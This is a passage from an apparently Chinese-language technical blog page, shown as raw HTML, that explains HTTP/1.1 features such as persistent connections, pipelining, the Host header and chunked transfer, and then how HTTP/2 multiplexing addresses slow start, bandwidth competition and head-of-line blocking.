url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB6ElEQVQoz42Sz08TQRTH95/y0MgVCEpR9GBaimxEY4DEiCcxmggmhosnE9HIbsnW/gK3S6H+IIJxm5CY8mOjB0n0YBPg4K+YKu2+NzM743S7aiB76ORlMvm+7yfzZt5TxJHFudxw/R4UVFwexdIYWCp9n/FT3hGvEgp/fTX9ORmrGmo1fak6N/CzYrQF+6y4uQbR9MGgWR8y613G74ebRIoeF23Bk2UWzdMBiyYsejJLdYeFw9/rfK/G93/x3Rr/0QjU22/ImTwOLeJwEaNZmN2mUmRcfDn4b64BVyZWSUSD7icQ0UEyLXjSJn1ZjBcwYWFvBjQfBiYuLOFxHbpSENFczaHKlE1iJo49x5FnOL0ewLdek95MEx608EQaHm014Qbl4yvkcgmvvMDhJTTeUeXqSzz22O1MQYfuXl8N4KkyOTvfLFtGfx50pwm7VMRM6Ej6ZWrugw2qVPY8a4eVPjLzA9vcD5ohyzmVg0QB1UXsy4Hmw9QTdpX9M+9888J/+8Ya6UmDfE7chM6UO7NBw39bSuxvyHMLvmNjf65xvuDKOJ1tJJ2gz+ywOfzmCVv0zItzRRFfFt15MeOItoakRX9auV/RRreM8e3UtcrsyO7bBT/T3mzT8l1ixomlkuJF8jTGnLnQ2f4DKZrVzHiOzCEAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 02 06 58"\n        title=""\n        src="/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-fee1c.png"\n        srcset="/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-a67b7.png 200w,\n/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-0b187.png 400w,\n/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-fee1c.png 800w,\n/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-54f32.png 1140w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从上图可以看出，HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。</p>\n<p>持久连接在 HTTP/1.1 中是默认开启的，所以你不需要专门为了持久连接去 HTTP 请求头设置信息，如果你不想要采用持久连接，可以在 HTTP 请求头中加上 Connection: close。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p>\n<h3 id="不成熟的-http-管线化"><a href="#%E4%B8%8D%E6%88%90%E7%86%9F%E7%9A%84-http-%E7%AE%A1%E7%BA%BF%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>不成熟的 HTTP 管线化</h3>\n<p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的队头阻塞的问题。</p>\n<p>HTTP/1.1 中试图通过管线化的技术来解决队头阻塞的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p>\n<p>FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。</p>\n<h3 id="提供虚拟主机的支持"><a href="#%E6%8F%90%E4%BE%9B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%94%AF%E6%8C%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>提供虚拟主机的支持</h3>\n<p>在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p>\n<p>因此，HTTP/1.1 的请求头中增加了 Host 字段，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p>\n<h3 id="支持动态生成内容"><a href="#%E6%94%AF%E6%8C%81%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%E5%86%85%E5%AE%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>支持动态生成内容</h3>\n<p>在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如 Content-Length: 901，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p>\n<p>HTTP/1.1 通过引入 Chunk transfer 机制来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p>\n<h3 id="客户端-cookie、安全机制"><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-cookie%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>客户端 Cookie、安全机制</h3>\n<p>除此之外，HTTP/1.1 还引入了客户端 Cookie 机制和安全机制。</p>\n<h2 id="总结"><a href="#%E6%80%BB%E7%BB%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>本文我们重点强调了 HTTP 是浏览器和服务器的通信语言，然后我们从需求演变的角度追溯了 HTTP 的发展史，在诞生之初的 HTTP/0.9 因为需求简单，所以和服务器之间的通信过程也相对简单。</p>\n<p>由于万维网的快速崛起，带来了大量新的需求，其中最核心的一个就是需要支持多种类型的文件下载， 为此 HTTP/1.0 中引入了请求头和响应头。在支持多种类型文件下载的基础之上，HTTP/1.0 还提供了 Cache 机制、用户代理、状态码等一些基础信息。</p>\n<p>但随着技术和需求的发展，人们对文件传输的速度要求越来越高，故又基于 HTTP/1.0 推出了 HTTP/1.1，增加了持久连接方法来提升连接效率，同时还尝试使用管线化技术提升效率（不过由于各种原因，管线化技术最终被各大厂商放弃了）。除此之外，HTTP/1.1 还引入了 Cookie、虚拟主机的支持、对动态内容的支持等特性。</p>\n<p>虽然 HTTP/1.1 在 HTTP/1.0 的基础之上做了大量的优化，但是由于一些效率问题始终很难解决，所以最终还是被 HTTP/2 所取代，这就是我们下一篇文章要介绍的内容了</p>\n<h1 id="http2：如何提升网络速度"><a href="#http2%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E7%BD%91%E7%BB%9C%E9%80%9F%E5%BA%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP2：如何提升网络速度</h1>\n<p>上一篇文章我们聊了 HTTP/1.1 的发展史，虽然 HTTP/1.1 已经做了大量的优化，但是依然存在很多性能瓶颈，依然不能满足我们日益变化的新需求，所以就有了我们今天要聊的 HTTP/2。</p>\n<p>本文我们依然从需求的层面来谈，先分析 HTTP/1.1 存在哪些问题，然后再来分析 HTTP/2 是如何解决这些问题的。</p>\n<p>我们知道 HTTP/1.1 为网络效率做了大量的优化，最核心的有如下三种方式：</p>\n<ul>\n<li>增加了持久连接；</li>\n<li>浏览器为每个域名最多同时维护 6 个 TCP 持久连接；</li>\n<li>使用 CDN 的实现域名分片机制。</li>\n</ul>\n<p>通过这些方式就大大提高了页面的下载速度，你可以通过下图来直观感受下：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-18aad.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 94.72%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACpklEQVQ4y52T2U8TURTG+Z/0wWiiJBo0moiAEpUIj0Yi8cEXow+YuMQYEKWyWNrapiAERKNRWWQtBYksIcG0tEBsp9Pp7HNvp7O1s3gHGAsGE/SXM8mZhy9nzne+KbEsyzAtTbdL1S3dtA5OCXoWkvn6/uzt9+L1PrH/O5Agy7CcA+p4jqX5OQ8/9oSfaOInm7nRxxoZ3RFPr2vn3eCyH55zi60jBLYZja7FHFAXj0d/pPw1uOs43lGGt5dhz47I8fEd8cyGdtEL6oKwwgN9YQFNphnWwf4IliLIgZv0YIMw1cIONRJd5fLGdFFc5QW1QXjBk301STNEMpHEHJJYKoX93MAD13DXCbzzDKo/J2+L0cf3LMiWZRZ0wwF1pl7Qsst9IOQC4XYw2yFMt+aZ9T3ium5b/GZR2fb/oG6H0M4+cOejWO0DPYvqPmLTUBLzucgQKik6Iq2N6FmyKL60Ja70wsC8aBmKJCsOsqJqcg4SgRrCW04N3CB76pJNh6XYWFFc/Ro0T0iVXtC9tXO+sGtn09LzKvPpLv3uFjt8n/18LxOsURLf9kxu/JKr8Px9Z1M3C6qZl828YhoF9O4YtmkbdsVvG9a7pP6bYTtuB2F5F/TPwYIMBQAdUJeFAifMuvnRh3ZCx59yww80MrJPSDwhDnIZIkM6ZEiKItMpPHA19eIY3nYq5SpNNh2SYk5IwpsaOhK6c5VPbPtKJNYjkeiaA+pischquq+eGWzgp1q40UeEr6oYz4m4drpdqPSAky9BxySXE2iSoh0ommHoDJ4O1uKuUpTNtPss9vyo9DueGK+/XVE+rKr9K+pyUlZlURRzDqiTclkIl3rBTBsId4LZTiG0K57/jS02Tfs224VupGkaAABNp7ZApqE/0zQMFNJdZR/zFxEj14MRjePDAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 13 41 25"\n        title=""\n        src="/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-fee1c.png"\n        srcset="/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-a67b7.png 200w,\n/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-0b187.png 400w,\n/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-fee1c.png 800w,\n/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-b1a91.png 1200w,\n/static/2021-07-15-13-41-25-56dea1a6fdb3e2f1ccbfb968ffcba3c1-18aad.png 1250w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>在该图中，引入了 CDN，并同时为每个域名维护 6 个连接，这样就大大减轻了整个资源的下载时间。这里我们可以简单计算下：如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 <code class="language-text">100*RTT</code>；若通过上面的技术，就可以把整个时间缩短为 <code class="language-text">100*RTT/(6*CDN个数)</code>。从这个计算结果来看，我们的页面加载速度变快了不少</p>\n<h2 id="http11-的主要问题"><a href="#http11-%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/1.1 的主要问题</h2>\n<p>虽然 HTTP/1.1 采取了很多优化资源加载速度的策略，也取得了一定的效果，但是 HTTP/1.1 对带宽的利用率却并不理想，这也是 HTTP/1.1 的一个核心问题。</p>\n<p>带宽是指每秒最大能发送或者接收的字节数。我们把每秒能发送的最大字节数称为上行带宽，每秒能够接收的最大字节数称为下行带宽。</p>\n<p>之所以说 HTTP/1.1 对带宽的利用率不理想，是因为 HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。</p>\n<p>之所以会出现这个问题，主要是由以下三个原因导致的。</p>\n<h3 id="tcp-的慢启动"><a href="#tcp-%E7%9A%84%E6%85%A2%E5%90%AF%E5%8A%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 的慢启动</h3>\n<p>一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，我们把这个过程称为慢启动。</p>\n<p>你可以把每个 TCP 发送数据的过程看成是一辆车的启动过程，当刚进入公路时，会有从 0 到一个稳定速度的提速过程，TCP 的慢启动就类似于该过程。</p>\n<p>慢启动是 TCP 为了减少网络拥塞的一种策略，我们是没有办法改变的。</p>\n<p>而之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p>\n<h3 id="tcp-连接竞争带宽"><a href="#tcp-%E8%BF%9E%E6%8E%A5%E7%AB%9E%E4%BA%89%E5%B8%A6%E5%AE%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 连接竞争带宽</h3>\n<p>你可以想象一下，系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p>\n<p>这样就会出现一个问题，因为有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p>\n<h3 id="http11-队头阻塞"><a href="#http11-%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/1.1 队头阻塞</h3>\n<p>通过上一篇文章，我们知道在 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p>\n<p>这是一个很严重的问题，因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。</p>\n<p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p>\n<p>但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。</p>\n<h2 id="http2-的多路复用"><a href="#http2-%E7%9A%84%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/2 的多路复用</h2>\n<p>前面我们分析了 HTTP/1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP/1.1 的机制导致的。</p>\n<p>那么该如何去解决这些问题呢？</p>\n<p>虽然 TCP 有问题，但是我们依然没有换掉 TCP 的能力，所以我们就要想办法去规避 TCP 的慢启动和 TCP 连接之间的竞争问题。</p>\n<p>基于此，HTTP/2 的思路就是一个域名只使用一个 TCP 长连接来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题。</p>\n<p>另外，就是队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，所以 HTTP/2 需要实现资源的并行请求，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。</p>\n<p>所以，HTTP/2 的解决方案可以总结为：一个域名只使用一个 TCP 长连接和消除队头阻塞问题。可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-0d494.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 47.267759562841526%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABwElEQVQoz32RXU/TYBTH93nwO/gBvNKQYACv5I5Lv4C8LGg0LgImShkgYBgv6hyWMeImZZLIS9w6tnajc+1Wlm0wNgp71qdP+7xAEe/Ek19Ozs0vOef8PeyWwoQhzAhl/ynPKaQbqvNNczQD0/MSqErtmgxqcqOUKIibzVLyam4fZ1uVNDG0ooHnZSeQxb9qxJWzDdq9QR+EaVBqmdKSKXKVH+NiaLgcH81FXmjffVL4WSH66mB1qL4/u6kYnSGrKwQXcu5KHumC+UYWJwbfxSs209YvEpP1vUk9/qa+yx3/pbrD6cLrVmY5WWcDH396V4Sgglw517R7Xw4HIoPpkzOmR0GSg5k5KzML0zNmYgKKnNtTU/BgmpX4VIN5l4WRpeiXQ9OVlSZ7vF7ujxb5rEl/rx5GnhdivnxsVF17KnvvFMbuyt4O1X8fpKaN5PxW/uxR2O75aq0oNzeTbh7f+0zCisn0WF54W9z2H+2817fGFf9D9UOfOtVVDj4x0gFT4cUa7uVRD48+KY4rn1tsu4yFI6cKKKMOdhD5A7YpwS4UE+xgGzFiA5tJp/SKk/b1w/4dMsYIIcuyAAAQwttyvgQpmMs9AgwXyAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 09 42"\n        title=""\n        src="/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-fee1c.png"\n        srcset="/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-a67b7.png 200w,\n/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-0b187.png 400w,\n/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-fee1c.png 800w,\n/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-b1a91.png 1200w,\n/static/2021-07-15-14-09-42-c0e3267b6667fe51c0184694fdd9b9ea-0d494.png 1464w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>该图就是 HTTP/2 最核心、最重要且最具颠覆性的多路复用机制。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p>\n<p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p>\n<p>HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求</p>\n<h2 id="多路复用的实现"><a href="#%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>多路复用的实现</h2>\n<p>现在我们知道为了解决 HTTP/1.1 存在的问题，HTTP/2 采用了多路复用机制，那 HTTP/2 是怎么实现多路复用的呢？你可以先看下面这张图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-10-11-631070ff43e3323ce53b990f465546c6-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 101.22591943957968%; position: relative; bottom: 0; left: 0; background-image: 